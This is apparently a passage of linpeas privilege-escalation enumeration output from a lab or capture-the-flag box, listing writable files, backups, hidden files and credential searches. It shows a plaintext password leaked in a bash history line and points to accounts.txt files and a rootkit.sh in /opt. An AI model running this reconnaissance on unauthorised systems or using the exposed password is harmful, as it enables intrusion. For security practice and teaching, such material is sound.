╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3194 Mar 26  2018 sbin.dhclient
-rw-r--r-- 1 root root  125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root 2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root  730 May  3  2021 usr.sbin.mysqld
-rw-r--r-- 1 root root 1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 32
drwxr-xr-x   2 root root 4096 Feb 12  2022 .
drwxr-xr-x 102 root root 4096 Feb 12  2022 ..
-rw-r--r--   1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--   1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--   1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rwxr-xr-x   1 root root  873 Jun  3  2020 Z99-cloudinit-warnings.sh
-rwxr-xr-x   1 root root 3417 Jun  3  2020 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/ubuntu
/root/
/var/www

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)

╔══════════╣ Readable files belonging to root and readable by me but not world readable

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/mike
/run/lock
/run/screen
/run/user/1001
/run/user/1001/gnupg
/run/user/1001/systemd
/tmp
/tmp/mike.out
/tmp/tmux-1001
/var/crash
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
  Group mike:
/tmp/mike.out



                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2021-08-25+10:22:01.0071785420 /var/www/html/gallery/login.php
2021-08-25+09:24:18.7731263730 /var/www/html/gallery/create_account.php
2021-08-25+08:42:07.5063291100 /var/www/html/gallery/initialize.php
2021-05-24+14:09:05.4985391770 /var/backups/mike_home_backup/.profile
2021-05-24+14:09:05.4985391770 /var/backups/mike_home_backup/images/my-cat.jpg
2021-05-24+14:09:05.4985391770 /var/backups/mike_home_backup/images/26-04.jpg
2021-05-24+14:09:05.4985391770 /var/backups/mike_home_backup/images/23-04.jpg
2021-05-24+14:09:05.4985391770 /var/backups/mike_home_backup/documents/accounts.txt
2021-05-24+14:09:05.4985391770 /var/backups/mike_home_backup/.bashrc
2021-05-24+14:09:05.4985391770 /var/backups/mike_home_backup/.bash_logout
2021-05-24+14:09:05.4985391770 /var/backups/mike_home_backup/.bash_history
2021-05-24+14:07:03.0267961510 /home/mike/documents/accounts.txt

╔══════════╣ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  2 root root 4096 May 22  2021 .
drwxr-xr-x 23 root root 4096 Feb 12  2022 ..
-rw-r--r--  1 root root  364 May 20  2021 rootkit.sh

╔══════════╣ Unexpected in root
/initrd.img
/vmlinuz
/vmlinuz.old
/initrd.img.old

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/tmp/mike.out
/home/mike/.gnupg/trustdb.gpg
/home/mike/.gnupg/pubring.kbx
/var/log/syslog
/var/log/auth.log
/var/log/journal/188102f17644450b99b0f035f1aa51b7/user-1001.journal
/var/log/journal/188102f17644450b99b0f035f1aa51b7/system.journal


╔══════════╣ Files inside /home/mike (limit 20)
total 44
drwxr-xr-x 6 mike mike 4096 Aug 25  2021 .
drwxr-xr-x 4 root root 4096 May 20  2021 ..
-rw------- 1 mike mike  135 May 24  2021 .bash_history
-rw-r--r-- 1 mike mike  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 mike mike 3772 May 20  2021 .bashrc
drwx------ 2 mike mike 4096 May 24  2021 documents
drwx------ 3 mike mike 4096 Aug 20 12:28 .gnupg
drwx------ 2 mike mike 4096 May 24  2021 images
drwxrwxr-x 3 mike mike 4096 Aug 25  2021 .local
-rw-r--r-- 1 mike mike  807 Apr  4  2018 .profile
-rwx------ 1 mike mike   32 May 14  2021 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/html/index.html
/var/www/html/gallery/login.php
/var/www/html/gallery/user/list.php
/var/www/html/gallery/user/index.php
/var/www/html/gallery/assets/css/styles.css
/var/www/html/gallery/assets/js/scripts.js
/var/www/html/gallery/build/scss/parts/adminlte.pages.scss
/var/www/html/gallery/build/scss/parts/_components.scss
/var/www/html/gallery/build/scss/parts/adminlte.plugins.scss
/var/www/html/gallery/build/scss/parts/_miscellaneous.scss
/var/www/html/gallery/build/scss/parts/_plugins.scss
/var/www/html/gallery/build/scss/parts/_extra-components.scss
/var/www/html/gallery/build/scss/parts/adminlte.extra-components.scss
/var/www/html/gallery/build/scss/parts/adminlte.core.scss
/var/www/html/gallery/build/scss/parts/_core.scss
/var/www/html/gallery/build/scss/parts/_pages.scss
/var/www/html/gallery/build/scss/parts/adminlte.components.scss
/var/www/html/gallery/build/scss/_bootstrap-variables.scss
/var/www/html/gallery/build/scss/_mixins.scss
/var/www/html/gallery/build/scss/_variables.scss

╔══════════╣ Searching installed mail applications
postfix
postfix-add-filter
postfix-add-policy
sendmail

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 9081 Jul 30  2021 /lib/modules/4.15.0-154-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8881 Jul 30  2021 /lib/modules/4.15.0-154-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 9081 Jan  5  2022 /lib/modules/4.15.0-167-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 8881 Jan  5  2022 /lib/modules/4.15.0-167-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 508 Aug 20 11:40 /run/blkid/blkid.tab.old
-rwxr-xr-x 1 root root 41705 May  3  2021 /usr/bin/wsrep_sst_xtrabackup-v2
-rwxr-xr-x 1 root root 21273 May  3  2021 /usr/bin/wsrep_sst_xtrabackup
-rwxr-xr-x 1 root root 17144136 May  3  2021 /usr/bin/mariabackup
-rwxr-xr-x 1 root root 37858 May  3  2021 /usr/bin/wsrep_sst_mariabackup
-rw-r--r-- 1 root root 1775 Feb 25  2021 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 1424 Aug 25  2021 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-36.pyc
-rw-r--r-- 1 root root 35544 Mar 25  2020 /usr/lib/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 0 Jan  5  2022 /usr/src/linux-headers-4.15.0-167-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jan  5  2022 /usr/src/linux-headers-4.15.0-167-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 217542 Jan  5  2022 /usr/src/linux-headers-4.15.0-167-generic/.config.old
-rw-r--r-- 1 root root 0 Jul 30  2021 /usr/src/linux-headers-4.15.0-154-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 0 Jul 30  2021 /usr/src/linux-headers-4.15.0-154-generic/include/config/net/team/mode/activebackup.h
-rw-r--r-- 1 root root 217425 Jul 30  2021 /usr/src/linux-headers-4.15.0-154-generic/.config.old
-rw-r--r-- 1 root root 11755 Feb 12  2022 /usr/share/info/dir.old
-rw-r--r-- 1 root root 361345 Feb  2  2018 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 7867 Nov  7  2016 /usr/share/doc/telnet/README.telnet.old.gz
-rwxr-xr-x 1 root root 226 Dec  4  2017 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 351 May  3  2021 /usr/share/man/man1/wsrep_sst_xtrabackup.1.gz
-rw-r--r-- 1 root root 357 May  3  2021 /usr/share/man/man1/wsrep_sst_xtrabackup-v2.1.gz
-rw-r--r-- 1 root root 348 May  3  2021 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz
-rw-r--r-- 1 root root 2746 Jan 23  2020 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 2765 Aug  6  2020 /etc/apt/sources.list.curtin.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission


╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root     root     4.0K May 20  2021 .
drwxr-xr-x 13 root     root     4.0K May 20  2021 ..
drwxr-xr-x  3 www-data www-data 4.0K Aug 25  2021 html

/var/www/html:
total 24K
drwxr-xr-x  3 www-data www-data 4.0K Aug 25  2021 .
drwxr-xr-x  3 root     root     4.0K May 20  2021 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 20 Aug 20 11:37 /run/cloud-init/.instance-id
-rw-r--r-- 1 root root 2 Aug 20 11:36 /run/cloud-init/.ds-identify.result
-rw-r--r-- 1 mike mike 220 Apr  4  2018 /home/mike/.bash_logout
-rw-r--r-- 1 root root 220 Apr  4  2018 /etc/skel/.bash_logout
-rw------- 1 root root 0 Aug  6  2020 /etc/.pwd.lock
-rw-r--r-- 1 root root 1531 May 20  2021 /etc/apparmor.d/cache/.features
-rw-r--r-- 1 landscape landscape 0 Aug  6  2020 /var/lib/landscape/.cleanup.user
-rwxr-xr-x 1 www-data www-data 213 Mar 19  2021 /var/www/html/gallery/build/config/.eslintrc.json
-rwxr-xr-x 1 www-data www-data 213 Mar 19  2021 /var/www/html/gallery/build/npm/.eslintrc.json
-rwxr-xr-x 1 www-data www-data 225 Mar 19  2021 /var/www/html/gallery/.htaccess
-rwxr-xr-x 1 www-data www-data 866 Mar 19  2021 /var/www/html/gallery/dist/js/.eslintrc.json
-rwxr-xr-x 1 root root 220 May 24  2021 /var/backups/mike_home_backup/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw-r--r-- 1 www-data www-data 163807 Aug 20 12:14 /tmp/www-data.out
-rw-rw-r-- 1 mike mike 133019 Aug 20 12:28 /tmp/mike.out
-rwxr-xr-x 1 www-data www-data 860335 Aug 20 12:12 /tmp/linpeas.sh
-rwxr-xr-x 1 root root 3772 May 24  2021 /var/backups/mike_home_backup/.bashrc
-rwxr-xr-x 1 root root 135 May 24  2021 /var/backups/mike_home_backup/.bash_history
-rwxr-xr-x 1 root root 220 May 24  2021 /var/backups/mike_home_backup/.bash_logout
-rwxr-xr-x 1 root root 20549 May 24  2021 /var/backups/mike_home_backup/images/23-04.jpg
-rwxr-xr-x 1 root root 159262 May 24  2021 /var/backups/mike_home_backup/images/my-cat.jpg
-rwxr-xr-x 1 root root 436526 May 24  2021 /var/backups/mike_home_backup/images/26-04.jpg
-rwxr-xr-x 1 root root 103 May 24  2021 /var/backups/mike_home_backup/documents/accounts.txt
-rwxr-xr-x 1 root root 807 May 24  2021 /var/backups/mike_home_backup/.profile

╔══════════╣ Searching passwords in history files
/home/mike/.bash_history:sudo -lb3stpassw0rdbr0xx
/home/mike/.bash_history:sudo -l
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @stats   = stats
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @items   = { _seq_: 1  }
/usr/lib/ruby/vendor_ruby/rake/thread_history_display.rb:      @threads = { _seq_: "A" }
/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx
/var/backups/mike_home_backup/.bash_history:sudo -l

╔══════════╣ Searching passwords in config PHP files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-36.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-36.pyc
/usr/lib/x86_64-linux-gnu/mariadb18/plugin/simple_password_check.so
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
2021-05-20 14:06:38,395 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords - wb: [644] 25 bytes
2021-05-20 14:06:38,397 - cc_set_passwords.py[DEBUG]: Leaving SSH config 'PasswordAuthentication' unchanged. ssh_pwauth=None
2022-02-12 21:36:19 status half-configured passwd:amd64 1:4.5-1ubuntu2
2022-02-12 21:36:19 status half-installed passwd:amd64 1:4.5-1ubuntu2
2022-02-12 21:36:19 status unpacked passwd:amd64 1:4.5-1ubuntu2
2022-02-12 21:36:19 upgrade passwd:amd64 1:4.5-1ubuntu2 1:4.5-1ubuntu2.2
2022-02-12 21:36:20 configure passwd:amd64 1:4.5-1ubuntu2.2 <none>
2022-02-12 21:36:20 status half-configured passwd:amd64 1:4.5-1ubuntu2.2
2022-02-12 21:36:20 status half-installed passwd:amd64 1:4.5-1ubuntu2
2022-02-12 21:36:20 status installed passwd:amd64 1:4.5-1ubuntu2.2
2022-02-12 21:36:20 status unpacked passwd:amd64 1:4.5-1ubuntu2.2
 base-passwd depends on libc6 (>= 2.8); however:
 base-passwd depends on libdebconfclient0 (>= 0.145); however:
dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
May 20 13:40:22 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
Selecting previously unselected package base-passwd.
Selecting previously unselected package passwd.
Setting up base-passwd (3.5.44) ...
Setting up passwd (1:4.5-1ubuntu1) ...
Shadow passwords are now on.
Unpacking base-passwd (3.5.44) ...
Unpacking base-passwd (3.5.44) over (3.5.44) ...
Unpacking passwd (1:4.5-1ubuntu1) ...
Upgrade: passwd:amd64 (1:4.5-1ubuntu2, 1:4.5-1ubuntu2.2)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 



```


/var/backups/mike_home_backup/documents/accounts.txt

/var/lib/rkhunter/tmp/passwd